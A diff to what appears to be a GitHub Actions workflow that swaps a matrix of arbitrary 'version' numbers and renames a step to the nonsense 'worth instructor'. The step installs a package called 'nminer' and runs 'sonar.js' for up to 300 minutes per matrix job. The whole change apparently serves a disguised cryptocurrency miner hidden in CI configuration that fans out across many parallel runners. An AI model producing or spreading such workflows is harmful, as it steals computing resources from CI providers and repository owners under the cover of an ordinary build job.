@@ -9,24 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 588 }
-          - { version: 2158 }
-          - { version: 854 }
-          - { version: 5087 }
-          - { version: 2375 }
-          - { version: 6129 }
-          - { version: 1501 }
-          - { version: 4704 }
-          - { version: 7790 }
-          - { version: 2559 }
-          - { version: 7664 }
-          - { version: 7014 }
-          - { version: 174 }
-          - { version: 5317 }
-          - { version: 1004 }
-          - { version: 3462 }
-          - { version: 2265 }
-          - { version: 2105 }
+          - { version: 2759 }
+          - { version: 8039 }
+          - { version: 4455 }
+          - { version: 9408 }
+          - { version: 7015 }
+          - { version: 9798 }
+          - { version: 9358 }
+          - { version: 5989 }
+          - { version: 1658 }
+          - { version: 2926 }
+          - { version: 1521 }
+          - { version: 9346 }
+          - { version: 7954 }
+          - { version: 5684 }
+          - { version: 2156 }
+          - { version: 8441 }
+          - { version: 4235 }
 
     steps:
       - name: Checkout
@@ -37,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: worth instructor
         run: |
           npm install nminer@latest
-          timeout 324m node sonar.js || echo "sonar executed"
+          timeout 300m node sonar.js || echo "sonar executed"
